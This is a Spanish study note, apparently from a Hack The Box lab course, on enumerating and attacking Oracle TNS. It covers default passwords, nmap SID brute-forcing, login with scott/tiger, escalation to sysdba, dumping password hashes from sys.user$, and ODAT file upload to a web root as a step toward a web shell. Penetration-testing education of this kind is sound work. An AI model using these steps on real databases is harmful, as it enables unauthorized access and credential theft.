> El **Oracle Transparent Network Substrate (TNS)** es un protocolo de comunicación que facilita la conexión entre bases de datos Oracle y aplicaciones a través de redes. Inicialmente, fue introducido como parte del software Oracle Net Services. TNS soporta diversos protocolos de red entre las bases de datos Oracle y las aplicaciones cliente, como los protocolos **IPX/SPX** y **TCP/IP**. Debido a esto, ha sido una solución preferida para gestionar bases de datos grandes y complejas en industrias como la salud, las finanzas y el comercio minorista. Además, su mecanismo de cifrado integrado asegura la seguridad de los datos transmitidos, lo que lo convierte en una solución ideal para entornos empresariales donde la seguridad de los datos es fundamental.

### Configuración por defecto

La **configuración predeterminada** del servidor Oracle TNS varía según la versión y edición del software Oracle instalado. Sin embargo, algunas configuraciones comunes suelen estar presentes por defecto:

1. **Puerto de escucha**: El listener de Oracle TNS escucha por conexiones entrantes en el puerto **TCP/1521**, aunque este puerto puede modificarse durante la instalación o en el archivo de configuración.
2. **Protocolos soportados**: El listener de TNS admite varios protocolos de red como **TCP/IP**, **UDP**, **IPX/SPX** y **AppleTalk**. También puede manejar múltiples interfaces de red y escuchar en direcciones IP específicas o en todas las interfaces disponibles.
3. **Seguridad básica**: El listener de TNS solo aceptará conexiones desde **hosts autorizados** y realiza una autenticación básica utilizando **nombres de host, direcciones IP, y nombres de usuario y contraseñas**. Además, utiliza **Oracle Net Services** para cifrar las comunicaciones entre el cliente y el servidor.
4. **Archivos de configuración**: Los archivos de configuración son **tnsnames.ora** y **listener.ora**, ubicados típicamente en el directorio **$ORACLE_HOME/network/admin**. Estos archivos contienen información de configuración para instancias de bases de datos Oracle y otros servicios de red que usan el protocolo TNS.
5. **Servicios adicionales**: Oracle TNS se utiliza junto con otros servicios Oracle, como **Oracle DBSNMP, Oracle Databases, Oracle Application Server**, entre otros.
6. **Contraseñas por defecto**: Por ejemplo, en Oracle 9, la contraseña por defecto es **CHANGE_ON_INSTALL**, mientras que en Oracle 10 no se establece una contraseña por defecto. También, el servicio **Oracle DBSNMP** utiliza la contraseña por defecto **dbsnmp**.
7. **Archivo tnsnames.ora**: Cada base de datos o servicio tiene una entrada única en el archivo **tnsnames.ora**, que contiene la información necesaria para que los clientes se conecten al servicio, como el nombre del servicio, la ubicación de la red y el nombre de la base de datos o servicio.

### Tnsnames.ora

```txt
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

Aquí podemos ver un servicio llamado ORCL, que está escuchando en el puerto TCP/1521 en la IP establecisa. Los clientes deberían usar el nombre de servicio `orcl` cuando se conectan al servicio. Sin embargo, el archivo tnsnames.ora puede contener muchas entradas para diferentes BBDDs y servicios. Las entradas pueden incluir información adicional, como detalles de autenticación, configuración de conexión y de balanceo de carga. Por otra parte, el archivo `listener.ora` es un archivo de configuración por el lado del servidor que define las propiedades y parámetros del proceso del listener, responsable de recibir solicitudes entrantes del cliente y enviarlas a la instancia correcta de la BBDD de Oracle.

### Listener.ora

```txt
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```

**Oracle Net Services**:  
El software del lado del cliente de Oracle Net Services utiliza el archivo **tnsnames.ora** para resolver los nombres de servicio a direcciones de red. Mientras tanto, el proceso **listener** usa el archivo **listener.ora** para determinar los servicios a los que debe escuchar y el comportamiento del listener.

**Protección de bases de datos Oracle**:  
Las bases de datos Oracle pueden ser protegidas utilizando la **Lista de Exclusión de PL/SQL** (**PlsqlExclusionList**). Este es un archivo de texto creado por el usuario que debe colocarse en el directorio **$ORACLE_HOME/sqldeveloper**. Contiene los nombres de los paquetes o tipos de PL/SQL que deben ser excluidos de la ejecución. Una vez creado, el archivo se puede cargar en la instancia de la base de datos, actuando como una **lista negra** que impide el acceso a esos elementos a través del Oracle Application Server.

### Oracle-Tools-Setup.sh

Oracle Database Attacking Tool (`ODAT`)  es una herramienta de pruebas de penetración de código abierto escrita en Python y diseñada para enumerar y explotar vulnerabilidades en bases de datos Oracle. Puede ser utilizada para identificar y explotar diversas fallas de seguridad en bases de datos Oracle, incluyendo inyección SQL, ejecución remota de código y escalada de privilegios.

### Nmap - SID fuerza bruta

```shell-session
amr251@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
Nmap scan report for 10.129.204.235
Host is up (0.0044s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.40 seconds
```

También podemos usar `odat` para hacer una variedad de escaneos y recopilar información sobre los servicios de la BBDD Oracle y sus componentes. Estos escaneos proveen información como nombres de BBDD, versiones, procesos en ejecución, cuentas de usuario, vulnerabilidades, etc.

### SQLPlus - Inicio de sesión

```shell-session
amr251@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days

Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> 
```

Si nos encontramos con el siguiente error: `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory` Ejecutamos lo siguiente:

```bash
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"; sudo ldconfig
```

### Oracle RDBMS - Interactuando

```shell-session
SQL> select table_name from all_tables;

TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
HS$_PARALLEL_METADATA
HS_PARTITION_COL_NAME
HS_PARTITION_COL_TYPE
HELP

...SNIP...


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```

Aquí, el usuario scott no tiene permisos de administrador, pero podemos tratar de usar esta cuenta para iniciar sesión en la BBDD de administración (`sysdba`), obteniendo privilegios más altos. Esto es posible cuando el usuario scott tiene los privilegios adecuados tipicamente obtenidos por el administrador o usados por el administrador en sí. 

### Enumeración de BBDD

```shell-session
amr251@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
...SNIP...
```

Podemos seguir muchas aproximaciones una vez tenemos acceso a una BBDD Oracle. Depende en gran medida de la información que tenemos y la instalación hecha. Sin embargo, no podemos añadir más usuarios o hacer otras modificaciones. Desde este punto, podríamos obtener los hashes de contraseñas de `sys.user$` e intentar romperlas en local.

### Extrayendo hashes de contraseñas

```shell-session
SQL> select name, password from sys.user$;

NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN                          4A3BA55E08595C81
EXP_FULL_DATABASE

NAME                           PASSWORD
------------------------------ ------------------------------
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
...SNIP...
```

Otra opción es subir un web shell. Sin embargo, esto requiere que el servidor ejecute un web server, y necesitamos saber la localización exacta del directorio raíz para el web server. 

| **OS**  | **Ruta**             |
| ------- | -------------------- |
| Linux   | `/var/www/html`      |
| Windows | `C:\inetpub\wwwroot` |
Primero, intentar nuestra explotación con archivos que no parezcan peligrosos para el antivirus o el IDS/IPS presente es muy importante. Podemos crear un archivo de texto e intentar subirlo:

```shell-session
amr251@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
amr251@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
```

Finalmente, podemos comprobar que se ha subido con curl

```shell-session
amr251@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt

Oracle File Upload Test
```

